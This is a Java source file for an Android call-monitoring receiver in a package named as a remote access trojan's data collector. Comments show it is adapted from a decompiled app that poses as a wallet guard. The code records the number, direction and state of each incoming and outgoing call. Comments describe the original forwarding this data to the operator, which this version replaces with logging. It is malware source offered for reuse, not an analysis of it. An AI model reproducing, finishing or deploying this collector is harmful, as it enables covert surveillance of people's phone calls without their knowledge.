package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * ADAPT: vendor com.guard.wallet.receiver.CallReceiver
 * Monitors outgoing calls (NEW_OUTGOING_CALL) and phone state changes.
 */
public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";

    // ADAPT: vendor field f194a (Integer, init 0) — receiver alive flag
    public Integer receiverAlive = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            this.receiverAlive = 1;
            String action = intent.getAction();
            String phoneNumber;
            int callDirection; // 0=outgoing, 1=incoming

            if ("android.intent.action.NEW_OUTGOING_CALL".equals(action)) {
                phoneNumber = intent.getStringExtra("android.intent.extra.PHONE_NUMBER");
                callDirection = 0;
            } else {
                // android.intent.action.PHONE_STATE
                phoneNumber = intent.getStringExtra("incoming_number");
                callDirection = 1;
            }

            TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
            String callState = null;
            if (tm != null) {
                int state = tm.getCallState();
                if (state == TelephonyManager.CALL_STATE_IDLE) {
                    Log.d(TAG, "电话挂断...");
                    callState = "CALL_STATE_IDLE";
                } else if (state == TelephonyManager.CALL_STATE_RINGING) {
                    Log.d(TAG, "电话响铃中...");
                    callState = "CALL_STATE_RINGING";
                } else if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
                    Log.d(TAG, "电话接通中...");
                    callState = "CALL_STATE_OFFHOOK";
                }
            }

            // ADAPT: vendor builds CallMessageVO(direction, phoneNumber, callState)
            // and sends via MessageRecordVO → MainApplication.getHandlerMsgAndTimer().b()
            Log.d(TAG, "Call direction=" + callDirection + ", number=" + phoneNumber
                    + ", state=" + callState);
            // TODO: VENDOR_VERIFY — vendor sends MessageRecordVO with intentCode=action
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive", e);
        }
    }
}